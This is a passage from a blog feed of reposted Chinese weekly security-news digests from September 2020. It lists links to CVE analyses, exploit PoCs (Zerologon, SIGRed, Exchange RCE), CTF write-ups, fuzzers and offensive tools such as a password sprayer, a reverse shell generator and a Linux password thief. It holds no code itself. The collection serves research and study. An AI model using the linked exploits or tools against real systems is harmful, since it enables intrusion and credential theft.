class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.doyensec.com&#x2F;2020&#x2F;09&#x2F;09&#x2F;fuzzilli-jerryscript.html修改fuzzilli fuzz js的文章</span><br></pre></td></tr></table></figure><p>•TinyInst</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;googleprojectzero&#x2F;TinyInstP0 开源了macos fuzz插桩工具TinyInst</span><br></pre></td></tr></table></figure><p>•Christian Holler: The Human Component in Bug Finding @FuzzCon Europe 2020</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;ifc2C5fLIWUFuzzCon2020《TheHumanComponentinBugFinding》议题视频</span><br></pre></td></tr></table></figure><h3 id="漏洞利用相关"><a href="#漏洞利用相关" class="headerlink" title="漏洞利用相关"></a>漏洞利用相关</h3><p>•ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;highaltitudehacks.com&#x2F;2020&#x2F;09&#x2F;05&#x2F;arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow&#x2F;ARM64逆向及漏洞利用系列第一篇</span><br></pre></td></tr></table></figure><p>•ARM64 Reversing and Exploitation Part 2 - Use After Free</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;highaltitudehacks.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;arm64-reversing-and-exploitation-part-2-use-after-free&#x2F;ARM64逆向及漏洞利用系列第二篇</span><br></pre></td></tr></table></figure><p>•ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;highaltitudehacks.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;arm64-reversing-and-exploitation-part-3-a-simple-rop-chain&#x2F;ARM64逆向及漏洞利用系列第三篇</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•UBUNTU PPP’S CVE-2020-15704 WRAP-UP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.synacktiv.com&#x2F;publications&#x2F;ubuntu-ppps-cve-2020-15704-wrap-upCVE-2020-15704 upnp提权漏洞分析</span><br></pre></td></tr></table></figure><p>•CVE-2018-8453 从BSOD到ExpLoit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.whsgwl.net&#x2F;blog&#x2F;CVE-2018-8453_0.htmlhttps:&#x2F;&#x2F;www.whsgwl.net&#x2F;blog&#x2F;CVE-2018-8453_1.html</span><br></pre></td></tr></table></figure><p>•CVE-2019-1458: Going from ‘in the wild report’ to POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;piotrflorczyk&#x2F;cve-2019-1458_POCCVE-2019-1458本地提权漏洞poc</span><br></pre></td></tr></table></figure><p>•Attacking the Qualcomm Adreno GPU</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;09&#x2F;attacking-qualcomm-adreno-gpu.htmlp0关于攻击QualcommAdreno GPU的文章</span><br></pre></td></tr></table></figure><p>•WSUS Attacks Part 2: CVE-2020-1013 a Windows 10 Local Privilege Escalation 1-Day</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.gosecure.net&#x2F;blog&#x2F;2020&#x2F;09&#x2F;08&#x2F;wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day&#x2F;CVE-2020-1013 win10提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Tencent Keen Security Lab 5G Security Research Demo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Ca9lPMMToi0&amp;feature&#x3D;youtu.be科恩实验室关于5G漏洞研究成果视频</span><br></pre></td></tr></table></figure><p>•The short story of 1 Linux Kernel Use-After-Free bug and 2 CVEs (CVE-2020-14356 and CVE-2020-25220)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;blog.pi3.com.pl&#x2F;?p&#x3D;720CVE-2020-14356以及CVE-2020-25220漏洞分析</span><br></pre></td></tr></table></figure><p>•Introduction to Inside XNU.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;h3adsh0tzz.com&#x2F;2020&#x2F;09&#x2F;inside-xnu-introduction&#x2F;XNU介绍</span><br></pre></td></tr></table></figure><p>•Introduction to iBoot</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;h3adsh0tzz.com&#x2F;inside-xnu&#x2F;iboot&#x2F;introiBoot介绍</span><br></pre></td></tr></table></figure><p>•iBoot Tasks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;h3adsh0tzz.com&#x2F;inside-xnu&#x2F;iboot&#x2F;tasks</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•TREVORspray</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blacklanternsecurity&#x2F;TREVORspraywindows password spraying工具</span><br></pre></td></tr></table></figure><p>•aes-finder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mmozeiko&#x2F;aes-finder在进程中查找aes密钥的工具</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•How to speed up the Rust compiler one last time</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.mozilla.org&#x2F;nnethercote&#x2F;2020&#x2F;09&#x2F;08&#x2F;how-to-speed-up-the-rust-compiler-one-last-time&#x2F;rust编译器性能提升分析</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.9.14-9.20一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.9.14-9.20%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.9.14-9.20%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-9-14-9-20一周安全知识动态"><a href="#2020-9-14-9-20一周安全知识动态" class="headerlink" title="2020.9.14-9.20一周安全知识动态"></a>2020.9.14-9.20一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•[compiler] Fix bug in SimplifiedLowering’s overflow computation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;v8&#x2F;v8&#x2F;+&#x2F;e371325bcb03f20a362ebfa48225159702c6fde7SimplifiedLowering-0处理不当</span><br></pre></td></tr></table></figure><p>•Firefox for Android LAN-Based Intent Triggering</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-com&#x2F;gl-security&#x2F;security-operations&#x2F;gl-redteam&#x2F;red-team-tech-notes&#x2F;-&#x2F;tree&#x2F;master&#x2F;firefox-android-2020针对firefox安卓端 Lan网段的攻击利用脚本</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•OneFuzz - A self-hosted Fuzzing-As-A-Service platform</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;onefuzz</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•CSAW CTF Quals 2020 Writeups</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2020&#x2F;09&#x2F;14&#x2F;181939https:&#x2F;&#x2F;github.com&#x2F;perfectblue&#x2F;ctf-writeups&#x2F;tree&#x2F;master&#x2F;2020&#x2F;csaw-quals-2020csaw-quals-2020 writeup</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•SRC-2020-0019 : Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;srcincite.io&#x2F;advisories&#x2F;src-2020-0019&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.ps1.txthttps:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.py.txtcve-2020-16875ExchangeServerDlpUtilsAddTenantDlpPolicy RCE漏洞公告及poc</span><br></pre></td></tr></table></figure><p>•Espressif ESP32: Bypassing Flash Encryption (CVE-2020-15048)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raelize.com&#x2F;posts&#x2F;espressif-systems-esp32-bypassing-flash-encryption&#x2F;CVE-2020-15048绕过Flash加密漏洞分析</span><br></pre></td></tr></table></figure><p>•MemFuck: Bypassing User-Mode Hooks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;winternl.com&#x2F;memfuck&#x2F;绕过User-ModeHook</span><br></pre></td></tr></table></figure><p>•CVE-2020-9964 - An iOS infoleak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;muirey03.blogspot.com&#x2F;2020&#x2F;09&#x2F;cve-2020-9964-ios-infoleak.htmlIOS信息泄露漏洞CVE-2020-9964分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-1472 Zerologon exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;nccfsas&#x2F;tree&#x2F;main&#x2F;Tools&#x2F;SharpZeroLogonhttps:&#x2F;&#x2F;github.com&#x2F;BC-SECURITY&#x2F;Invoke-ZeroLogonhttps:&#x2F;&#x2F;www.lares.com&#x2F;blog&#x2F;from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.secura.com&#x2F;blog&#x2F;zero-logonCVE-2020-1472Zerologon利用脚本及漏洞分析</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;iamnoooob&#x2F;CVE-Reverse&#x2F;tree&#x2F;master&#x2F;CVE-2020-15505https:&#x2F;&#x2F;blog.orange.tw&#x2F;2020&#x2F;09&#x2F;how-i-hacked-facebook-again-mobileiron-mdm-rce.htmlMobileiron MDM RCE CVE-2020-15505 poc及writeup</span><br></pre></td></tr></table></figure><p>•Zerologon: instantly become domain admin by subverting Netlogon cryptography (CVE-2020-1472)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.secura.com&#x2F;blog&#x2F;zero-logonCVE-2020-1472Zerologon提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Clash of the (Spam)Titan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sensepost.com&#x2F;blog&#x2F;2020&#x2F;clash-of-the-spamtitan&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;ClashofSpamTitanSpamTitanGateway漏洞挖掘</span><br></pre></td></tr></table></figure><p>•CVE-2020-9496: RCE IN APACHE OFBIZ XMLRPC VIA DESERIALIZATION OF UNTRUSTED DATA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;9&#x2F;14&#x2F;cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-dataApacheOFBiz CVE-2020-9496 RCE 分析</span><br></pre></td></tr></table></figure><p>•POSTGRESQL CODE EXECUTION: UDF REVISITED</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@afinepl&#x2F;postgresql-code-execution-udf-revisited-3b08412f47c1POSTGRESQL 代码执行分析</span><br></pre></td></tr></table></figure><p>•Aruba Clearpass RCE (CVE-2020-7115)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dozer.nz&#x2F;posts&#x2F;aruba-clearpass-rceArubaClearPassPolicyManager&lt;&#x3D; 6.9.0免认证CVE-2020-7115漏洞分析</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•Symbolizer - A fast execution trace symbolizer for Windows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0vercl0k&#x2F;symbolizerwindows trace symbolizer 工具</span><br></pre></td></tr></table></figure><p>•Reverse Shell Generator</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;weibell.github.io&#x2F;reverse-shell-generator&#x2F;在线反弹shell生成器</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.9.21-9.27一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.9.21-9.27%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.9.21-9.27%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-9-21-9-27一周安全知识动态"><a href="#2020-9-21-9-27一周安全知识动态" class="headerlink" title="2020.9.21-9.27一周安全知识动态"></a>2020.9.21-9.27一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Resmack: Part 2: Full Fuzzer Detour</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;narly.me&#x2F;posts&#x2F;resmack-detour-full-fuzzer-experiment&#x2F;用resmack来做fuzzer</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•Official solution for 0CTF/TCTF 2020 Finals challenge Emoji Revenge</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;0xKira&#x2F;077cd03ffd5273dd566533dd8e02824b0CTF&#x2F;TCTF 2020决赛EmojiRevenge官方writeup</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Fuzzing V8 Engine JavaScript WebAssembly API using Dharma</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;academy.fuzzinglabs.com&#x2F;fuzzing-v8-engine-javascript-webassembly-api-using-dharma使用Dharma fuzz v8的WebAssembly API</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•VMware Workstation: Attack surface through Virtual Printer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.khonggianmang.vn&#x2F;vmware-workstation-attack-surface-through-virtual-printer&#x2F;VMware逃逸漏洞CVE-2020-3989以及CVE-2020-3990分析</span><br></pre></td></tr></table></figure><p>•Cloud Network Security 101: Azure Virtual Network Service Endpoints</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.fugue.co&#x2F;blog&#x2F;cloud-network-security-101-azure-virtual-network-service-endpointsAzure虚拟网络服务终端部署</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Writing an iOS Kernel Exploit from Scratch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;secfault-security.com&#x2F;blog&#x2F;chain3.htmlios kernel 利用</span><br></pre></td></tr></table></figure><p>•CVE-2020-1350 Windows DNS Server • 10.0.17763.1075 (WinBuild.160101.0800) • Integer Overflow</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cpr-zero.checkpoint.com&#x2F;vulns&#x2F;cprid-2156&#x2F;Windows DNS Server CVE-2020-1350整数溢出漏洞</span><br></pre></td></tr></table></figure><p>•CVE-2020-9964 - An iOS infoleak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;muirey03.blogspot.com&#x2F;2020&#x2F;09&#x2F;cve-2020-9964-ios-infoleak.html?m&#x3D;1CVE-2020-9964  iOS信息泄露漏洞分析</span><br></pre></td></tr></table></figure><p>•Containing a Real Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gvisor.dev&#x2F;blog&#x2F;2020&#x2F;09&#x2F;18&#x2F;containing-a-real-vulnerability&#x2F;CVE-2020-14386 linux提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Code Execution Vulnerability in Instagram App for Android and iOS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;research.checkpoint.com&#x2F;2020&#x2F;instagram_rce-code-execution-vulnerability-in-instagram-app-for-android-and-ios&#x2F;Instagram安卓以及iOS端代码执行漏洞分析</span><br></pre></td></tr></table></figure><p>•Kernel exploitation: weaponizing CVE-2020-17382 MSI Ambient Link driver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.matteomalvica.com&#x2F;blog&#x2F;2020&#x2F;09&#x2F;24&#x2F;weaponizing-cve-2020-17382&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;uf0o&#x2F;CVE-2020-17382CVE-2020-17382 windows 内核漏洞分析及poc</span><br></pre></td></tr></table></figure><p>•Exploiting SIGRed (CVE-2020–1350) on Windows Server 2012/2016/2019</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@datafarm.cybersecurity&#x2F;exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228SIGRed(CVE-2020–1350)在Windows server 2012&#x2F;2016&#x2F;2019中的利用</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•Local Privilege Escalation in Fortinet SSL VPN client for Linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.synacktiv.com&#x2F;sites&#x2F;default&#x2F;files&#x2F;2020-09&#x2F;fortinet_sslvpn_client_lpe.pdfFortinet SSL VPN linux客户端本地提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Pandora FMS 742: Critical Code Vulnerabilities Explained</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.sonarsource.com&#x2F;pandora-fms-742-critical-code-vulnerabilities-explainedPandora FMS 认证前命令注入漏洞</span><br></pre></td></tr></table></figure><p>•IBM QRadar Wincollect Escalation of Privilege (CVE-2020-4485 &amp; CVE-2020-4486)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.redyops.com&#x2F;index.php&#x2F;2020&#x2F;09&#x2F;11&#x2F;ibm-qradar-wincollect-escalation-of-privileges-cve-2020-4485-cve-2020-4486&#x2F;IBM QRadarWincollect本地提权漏洞CVE-2020-4485以及CVE-2020-4486分析</span><br></pre></td></tr></table></figure><p>•uTorrent CVE-2020-8437 Vulnerability And Exploit Overview</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.whtaguy.com&#x2F;2020&#x2F;09&#x2F;utorrent-cve-2020-8437-vulnerability.htmluTorrent CVE-2020-8437漏洞利用分析</span><br></pre></td></tr></table></figure><p>•Java RMI for pentesters: structure, recon and communication (non-JMX Registries).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@afinepl&#x2F;java-rmi-for-pentesters-structure-recon-and-communication-non-jmx-registries-a10d5c996a79Java RMI相关漏洞分析</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•One Part Steganography, Four Redirectors, and a Splash of C2!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@curtbraz&#x2F;one-part-steganography-four-redirectors-and-a-splash-of-c2-e13e5a65daa9使用二维码隐藏通信流量</span><br></pre></td></tr></table></figure><p>•Guy’s 30 Reverse Engineering Tips &amp; Tricks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.whtaguy.com&#x2F;2020&#x2F;04&#x2F;guys-30-reverse-engineering-tips-tricks.html30个逆向小技巧</span><br></pre></td></tr></table></figure><p>•UEFI Secure Boot Customization</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;media.defense.gov&#x2F;2020&#x2F;Sep&#x2F;15&#x2F;2002497594&#x2F;-1&#x2F;-1&#x2F;0&#x2F;CTR-UEFI-SECURE-BOOT-CUSTOMIZATION-20200915.PDF&#x2F;CTR-UEFI-SECURE-BOOT-CUSTOMIZATION-20200915.PDFNSA关于UEFI SecureBoot的报告</span><br></pre></td></tr></table></figure><p>•BLUR attacks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hexhive.epfl.ch&#x2F;BLURtooth&#x2F;CVE-2020-15802蓝牙漏洞分析</span><br></pre></td></tr></table></figure><p>•How to Build a Hacking VPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@robertscocca&#x2F;how-to-build-a-hacking-vps-44159f1eb55c如何配置一个用来搞事情的VPS</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•Impost3r: A linux password thief</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securityonline.info&#x2F;impost3r-a-linux-password-thief&#x2F;linux密码提取工具</span><br></pre></td></tr></table></figure><p>•NoSQLi - A Fast NoSQL Injection Scanner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nullsweep.com&#x2F;nosqli-a-fast-nosql-injection-framework&#x2F;NoSQL注入漏洞扫描器</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SubLime 使用技巧|故障解决方案</title>
      <link href="/2020/07/07/SubLime-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7-%E6%95%85%E9%9A%9C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2020/07/07/SubLime-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7-%E6%95%85%E9%9A%9C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
